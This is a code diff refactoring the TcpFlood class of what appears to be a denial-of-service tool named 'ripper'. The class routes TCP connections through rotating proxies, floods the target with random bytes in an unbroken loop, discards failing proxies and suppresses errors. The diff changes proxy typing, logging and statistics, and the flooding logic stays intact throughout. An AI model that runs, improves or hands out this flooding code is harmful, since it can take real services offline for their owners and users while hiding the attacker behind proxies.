@@ -7,11 +7,12 @@ from ripper.context.events_journal import EventsJournal
 from ripper.context.target import Target
 from ripper.common import generate_random_bytes
 from ripper.actions.attack_method import AttackMethod
+from ripper.proxy import Proxy
 
 # Forward Reference
 Context = 'Context'
 
-Events = EventsJournal()
+events_journal = EventsJournal()
 
 
 class TcpFlood(AttackMethod):
@@ -23,12 +24,11 @@ class TcpFlood(AttackMethod):
     _sock: socket
     _target: Target
     _ctx: Context
-    # TODO Make concrete
-    _proxy: Any = None
+    _proxy: Proxy = None
 
-    def __init__(self, target: Target, context: Context):
+    def __init__(self, target: Target, _ctx: Context):
         self._target = target
-        self._ctx = context
+        self._ctx = _ctx
 
     def create_connection(self) -> socket:
         self._proxy = self._ctx.proxy_manager.get_random_proxy()
@@ -39,14 +39,15 @@ class TcpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as tcp_conn:
-            self._ctx.target.statistic.connect.status_success()
-            Events.info('Creating new TCP connection...')
+            self._target.stats.connect.status_success()
+            events_journal.info('Creating new TCP connection...', target=self._target)
             while self.send(tcp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
-            self._ctx.target.statistic.connect.status_failed()
+            self._target.stats.connect.status_failed()
+            # self._ctx.sock_manager.close_socket()
 
     def send(self, sock: socket) -> bool:
         send_bytes = generate_random_bytes(
@@ -55,12 +56,12 @@ class TcpFlood(AttackMethod):
         try:
             sent = sock.send(send_bytes)
         except ProxyError as ep:
-            Events.exception(ep)
+            events_journal.exception(ep, target=self._target)
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
-            Events.exception(e)
+            events_journal.exception(e, target=self._target)
         else:
-            self._ctx.target.statistic.packets.status_sent(sent_bytes=sent)
+            self._target.stats.packets.status_sent(sent_bytes=sent)
             self._proxy.report_success() if self._proxy is not None else 0
             return True
 
